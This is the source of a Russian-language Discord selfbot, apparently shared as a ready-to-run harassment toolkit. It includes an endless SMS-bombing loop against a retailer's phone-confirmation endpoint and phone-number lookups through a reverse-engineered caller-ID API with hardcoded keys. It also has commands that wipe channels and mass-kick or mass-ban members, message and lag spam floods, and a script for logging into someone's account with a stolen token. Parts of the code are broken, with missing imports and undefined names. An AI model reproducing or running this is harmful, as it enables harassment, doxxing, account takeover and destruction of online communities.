import threading  # Подключаем модуль threading для работы с потоками
import socket
import sys
import discum
import discord
from discord.ext import commands
import random
import typing 
import requests as rq 
import random, os, json, re
from user_agent import generate_user_agent
import time
import json
import base64
import hmac
import hashlib
import binascii
from bs4 import BeautifulSoup
from colorama import Fore, Style
from termcolor import colored
from Crypto.Cipher import AES
bot = commands.Bot(command_prefix = "C/", self_bot = True)
bot1 = discum.Client(token="токен акка", log=False)
TOKEN = 'gWFDtf18f16d9c97c01a58948fee3c6201094e93d6d3f102177c5778052' # токен не от акка))
key = b'2Wq7)qkX~cp7)H|n_tc&o+:G_USN3/-uIi~>M+c ;Oq]E{t9)RC_5|lhAA_Qq%_4'
AES_KEY = 'e62efa9ff5ebbc08701f636fcb5842d8760e28cc51e991f7ca45c574ec0ab15c'
unicode = ('unicode',True)
class AESCipher(object):
    def __init__(self, AES_KEY): 
        self.bs = AES.block_size
        self.AES_KEY = binascii.unhexlify(AES_KEY)
    def encrypt(self, raw):
        raw = self._pad(raw)
        cipher = AES.new(self.AES_KEY, AES.MODE_ECB)
        return base64.b64encode(cipher.encrypt(raw.encode()))
    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        cipher = AES.new(self.AES_KEY, AES.MODE_ECB)
        return self._unpad(cipher.decrypt(enc)).decode('utf-8')
    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)
    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]
aes = AESCipher(AES_KEY)
@bot.command()
async def sc(ctx, token):
    sc = '**Скрипт что-бы войти:** \n```function login(token) {\n    setInterval(() => {\n        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`\n    }, 50);\n    setTimeout(() => {\n        location.reload();\n    }, 2500);\n}\n    login("' + str(token) + '");\n```'
    await ctx.send(sc)
@bot.event
async def on_ready():
    channel = bot.get_channel(chennel)
    await bot.change_presence(activity=discord.Streaming(name="Селфбот включен", url="https://www.youtube.com/channel/UCl_vlQNBSLU_aQ41o8batJQ"))    
    message=await channel.send(f"Текущий пинг селфбота: {int(bot.latency*1000)}ms⏲")
    await channel.send("CatStark © 2021. Все права застроены обсидианом")
@bot.command()
async def Spam(ctx, *, text):
    await ctx.message.delete()
    while True:
        await ctx.send(text)
        if ctx.message.content == "C1топ":
            break

@bot.command()
async def ping(ctx):
    await ctx.message.delete()
    message=await ctx.send(f"Текущий пинг селфбота: {int(bot.latency*1000)}ms⏲")
    await ctx.send("CatStark © 2021. Все права застроены обсидианом")
def randsym():
    
    return ''.join([random.choice(list('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&()*+,-./:;<=>?@[\]^_{|}~')) for _ in range(20)]) if not unicode else ''.join([chr(random.randint(1,1114112)) for _ in range(20)])
@bot.command()
async def GhostSpam(ctx):
    await ctx.message.delete()
    await ctx.send("||" + '\n' * 1996 + '||')
    if ctx.message.content == "С1топ":
        pass 
@bot.command()
async def SpamLag(ctx, numb: typing.Optional[int]=100):
    
    
    for x in range(numb):
        try:
            await ctx.send(''.join([chr(random.randint(1,1114112)) for _ in range(1999)]))
            
        except:
            pass


@bot.command()
async def SmsAtack(ctx, *, text):
    await ctx.message.delete()
    
    await ctx.send("Вы начали смс бомбер атаку, для прекращения перезапустите селфбота")
    head = {
    "User-Agent": generate_user_agent(device_type="desktop", os=("mac", "linux")),
    "X-Requested-With": "XMLHttpRequest",
}
    
    while True:
        try:
            requests.post(
                f"https://www.citilink.ru/registration/confirm/phone/+{text}/",
                headers=head,
                timeout=2,
            )
            
            await ctx.send("Отправлено")
            
        except:
            await ctx.send("Не отправлено")
    await ctx.send("Вы завершили атаку")

@bot.command()
async def GameStatus(ctx, *, text):
    await ctx.message.delete()
    await bot.change_presence(activity=discord.Game(name=text))
    
@bot.command()
async def StreamStatus(ctx, *, text):
    await ctx.message.delete()
    await bot.change_presence(activity=discord.Streaming(name=text, url="https://www.youtube.com/channel/UCl_vlQNBSLU_aQ41o8batJQ"))




@bot.command(description='Сделать копию сервера')
async def ServerClone(ctx, guild: typing.Optional[discord.Guild]=None, new_guild: typing.Optional[discord.Guild]=None):
    await ctx.message.delete()
    if not guild and not ctx.guild:
        await ctx.send('Ты не указал сервер для копирования!')
    elif not guild and ctx.guild:
        guild = ctx.guild
    icon_hash = guild.icon
    with open('clone_icon.png', 'wb+') as handle:
        handle.write(rq.get(f'https://cdn.discordapp.com/icons/{guild.id}/{icon_hash}.png', headers={'User-agent': 'Mozilla/5.0'}).content)
    if not new_guild:
        new_guild = await bot.create_guild(name=guild.name, icon=open('clone_icon.png', 'rb').read() if icon_hash else None)
    try: os.remove('clone_icon.png')
    except: pass
    
    roles = {}
    r = guild.roles
    r.reverse()
    for role in r:
        if role.is_bot_managed() or role.is_default() or role.is_integration() or role.is_premium_subscriber(): continue
        new_role=await new_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)
        roles[role] = new_role
    everyone = guild.default_role
    roles[everyone] = new_guild.default_role
    await new_guild.default_role.edit(permissions=everyone.permissions, color=everyone.color, hoist=everyone.hoist, mentionable=everyone.mentionable)
    
    dcc = await new_guild.fetch_channels()
    for dc in dcc:
        try: await dc.delete()
        except: pass
    channels = {None: None}
    for cat in guild.categories:
        new_c = await new_guild.create_category(name=cat.name, position=cat.position)
        channels[cat] = new_c
    for catt in guild.by_category():
        cat = catt[0]
        chs = catt[1]
        if cat != None:
            for c in chs:
                if c.type==discord.ChannelType.text:
                    new_c = await new_guild.create_text_channel(name=c.name, category=channels[c.category], position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                elif c.type==discord.ChannelType.voice:
                    new_c = await new_guild.create_voice_channel(name=c.name, category=channels[c.category], position=c.position, user_limit=c.user_limit)
                elif c.type==discord.ChannelType.news:
                    new_c = await new_guild.create_text_channel(name=c.name, category=channels[c.category], position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                try:
                    channels[c] = new_c
                except:
                    pass
        else:
            for c in chs:
                if c.type==discord.ChannelType.text:
                    new_c = await new_guild.create_text_channel(name=c.name, category=None, position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                elif c.type==discord.ChannelType.voice:
                    new_c = await new_guild.create_voice_channel(name=c.name, category=None, position=c.position, user_limit=c.user_limit)
                elif c.type==discord.ChannelType.news:
                    new_c = await new_guild.create_text_channel(name=c.name, category=None, position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                try:
                    channels[c] = new_c
                except:
                    pass
    
    for c in guild.channels:
        overs = c.overwrites
        over_new = {}
        for target,over in overs.items():
            if isinstance(target, discord.Role):
                try:
                    over_new[roles[target]] = over
                except:
                    pass
        try:
            await channels[c].edit(overwrites=over_new)
        except:
            pass
    await new_guild.edit(verification_level=guild.verification_level, default_notifications=guild.default_notifications, explicit_content_filter=guild.explicit_content_filter, system_channel=channels[guild.system_channel], system_channel_flags=guild.system_channel_flags, afk_channel=channels[guild.afk_channel], afk_timeout=guild.afk_timeout)
    try:
        await new_guild.create_template(name=guild.name)
    except:
        pass
    else:
        try:
            temps = await new_guild.templates()
        except:
            await ctx.send('Не смог авто-создать шаблон')
        else:
            await ctx.send(f'Авто-создан шаблон сервера: discord.new/{temps[0].code}')

@bot.command(description="Скачать все эмодзи с текущего сервера")
async def DumpEmojis(ctx):
    await ctx.message.delete()
    if not ctx.guild:
        return
    if len(ctx.guild.emojis) == 0:
        return await ctx.send('Эмодзи нет окда')
    papka = f'emojis-{ctx.guild.id}'
    os.mkdir(papka)
    os.chdir(papka)
    for emoji in ctx.guild.emojis:
        if emoji.animated:
            try:
                with open(f'{emoji.name}.gif', 'wb+') as w:
                    w.write(rq.get(str(emoji.url), headers={'User-agent': 'Mozilla/5.0'}).content)
            except:
                pass
        else:
            try:
                with open(f'{emoji.name}.png', 'wb+') as w:
                    w.write(rq.get(str(emoji.url_as(format='png', static_format='png')), headers={'User-agent': 'Mozilla/5.0'}).content)
            except:
                pass
    os.chdir('..')
    await ctx.send(f'Успешно сохранил эмодзи в папке {papka}')

def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)

@bot.command()
async def restart(ctx):
    await ctx.message.delete()
    await ctx.send(embed = discord.Embed(title = "Server Settings", description = "Перезагрузка...", colour=discord.Color.from_rgb(255, 215, 0)))
    restart_program()


@bot.command()
async def info(ctx):
    await ctx.send("CatStark © 2021. Все права застроены обсидианом")

@bot.command()
async def invisiblenick(ctx):
    await ctx.message.delete()
    try:
        name = "‎‎‎‎‎‎‎‏‏‎ ឵឵ ឵឵ ឵឵ ឵឵‎"
        await ctx.author.edit(nick=name)
    except Exception as e:
        await ctx.send(f"Error: {e}")


def sendPost(url, data, sig, ts):
    
    headers = {'X-App-Version': '4.9.1',
        'X-Token':TOKEN,
        'X-Os': 'android 5.0',
        'X-Client-Device-Id': '14130e29cebe9c39',
        'Content-Type': 'application/json; charset=utf-8',
        'Accept-Encoding': 'deflate',
        'X-Req-Timestamp': ts,
        'X-Req-Signature': sig,
        'X-Encrypted': '1'}
    
    r = rq.post(url, data=data, headers=headers, verify=True)
    return json.loads(aes.decrypt(r.json()['data']))

@bot.command()
async def parsGetCon(ctx, *, text):
    await ctx.message.delete()
    if '+' not in text:
        phone = '+'+text 
    else:
        phone = text
   
    def getByPhone(phone):
   
        ts = str(int(time.time()))

        req = f'"countryCode":"RU","source":"search","token":"{TOKEN}","phoneNumber":"{phone}"'
        req = '{'+req+'}'
        string = str(ts)+'-'+req
   
        sig = base64.b64encode(hmac.new(key, string.encode(), hashlib.sha256).digest()).decode()
        crypt_data = aes.encrypt(req)
   
        return sendPost('https://pbssrv-centralevents.com/v2.5/search',
                    b'{"data":"'+crypt_data+b'"}', sig, ts)
   
    finfo = getByPhone(phone)
   
   
    try:
        await ctx.send(colored(finfo['result']['profile']['displayName'], 'green'))
        await ctx.send(colored('Имен найдено: '+str(finfo['result']['profile']['tagCount']), 'yellow'))
           
  
        await ctx.send('\n'.join([i['tag'] for i in getByPhoneTags(phone)['result']['tags']]))
    except KeyError:
        await ctx.send("Пока что ниче вроде")
               
           
    else:
        await ctx.send('Не, хуйня идея')

@bot.command()
async def deletechannel(ctx):
    failed = []
    counter = 0
    for channel in ctx.guild.channels: 
        try:
            await channel.delete(reason="По просьбе") 
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)
    await ctx.author.send(f"Удалено {counter} каналов. {f'Не удалил: {fmt}' if len(failed) > 0 else ''}")

@bot.command()
async def allkick(ctx):
    for m in ctx.guild.members:
        try:
            await m.kick(reason="По просьбе") 
        except:
            pass
@bot.command()
async def allban(ctx):
    for m in ctx.guild.members: 
        try:
            await m.ban(reason="По просьбе")
        except:
            pass      


@bot.command()
async def pars_simcard(ctx,*,text):
    await ctx.message.delete()
    phone = text
    try:
        getInfo = "https://htmlweb.ru/geo/api.php?json&telcod=" + str(phone)
        try:
            infoPhone = urllib.request.urlopen( getInfo )
        except:
            await ctx.send( "Телефон не найден" )
        infoPhone = json.load( infoPhone )
        await ctx.send( u"Страна:", infoPhone["country"]["name"] )
        await ctx.send( u"Регион:", infoPhone["region"]["name"] )
        await ctx.send( u"Округ:", infoPhone["region"]["okrug"] )
        await ctx.send( u"Оператор:", infoPhone["0"]["oper"] )
        await ctx.send( u"Часть света:", infoPhone["country"]["location"] )
    except:
        await ctx.send("Не найдено!")

@bot.command(aliases=['help', 'h', 'помощь', 'Help'])
async def __help(ctx):
    embed = discord.Embed(colour=discord.Color.from_rgb(255, 215, 0))
    embed.set_author(name = f"{bot.user.name} | Помощь по командам", icon_url = bot.user.avatar_url)
    embed.set_thumbnail(url = 'https://pbs.twimg.com/media/C16VZ6gVEAAxJt7.jpg')
    embed.add_field(name = 'Помощь', value = '`C/Help`')
    embed.add_field(name = 'Краши', value = '`C/deletechannel`, `C/allban`, `C/allkick`')
    embed.add_field(name = 'Embed', value = '`C/Embed`')
    embed.add_field(name = 'Смс-бомбер', value = '`C/SmsAtack`⠀⠀')
    embed.add_field(name = 'Пробив номера', value = '`C/parsGetCon`, `C/pars_simcard`')
    embed.add_field(name = 'Информация', value = '`C/info`')
    embed.add_field(name = 'Сервер', value = '`C/ServerClone`')
    embed.add_field(name = 'Получить скрипт по заходу в аккаунт по токену', value = '`C/sc`')
    embed.add_field(name = 'Невидимый ник', value = '`C/invisiblenick`')  
    embed.add_field(name = 'Спам', value = '`C/Spam а дальше текст`, `C/GhostSpam`, `C/SpamLag`')
    embed.add_field(name = 'перезапуск', value = '`C/restart`')
    await ctx.send(embed = embed)



bot.run("токен акка", bot = False)
